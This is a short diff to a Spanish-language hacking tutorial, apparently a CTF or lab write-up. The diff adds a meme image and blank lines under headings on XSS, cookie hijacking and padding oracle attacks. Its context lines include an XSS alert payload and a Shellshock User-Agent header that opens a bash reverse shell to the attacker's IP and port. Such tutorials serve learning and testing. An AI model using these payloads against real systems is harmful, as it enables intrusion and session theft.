@@ -347,6 +347,8 @@ Ahora vamos a probar otra cosa con la que podemos comprobar si una web es vulner
 <script>alert("XSS vulnerability found uwu")</script>
 ```
 
+![](/assets/images/login-bypass/XSS-meme.jpg)
+
 ## Cookie Hijacking
 
 Claro, con esto podemos hacer que al ver el mensaje `nos mande la coockie de sesion del usuario` que ha visto el mensaje.
@@ -409,6 +411,8 @@ User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/{mi ip}/{puerto} 0>&1
 Le damos a `Forward` y se supone que ganaríamos `acceso al sistema`, si no funciona, lo intentaríamos un par de veces más, por si acaso, y si sigue sin funcionar pues a mirar 	que emos hecho mal.
 
 # PADDING ORACLE ATTACK con PADDBUSTER
+
+
 
 # BIT FLIPPER ATTACK para PADDING ORACLE ATTACK
 
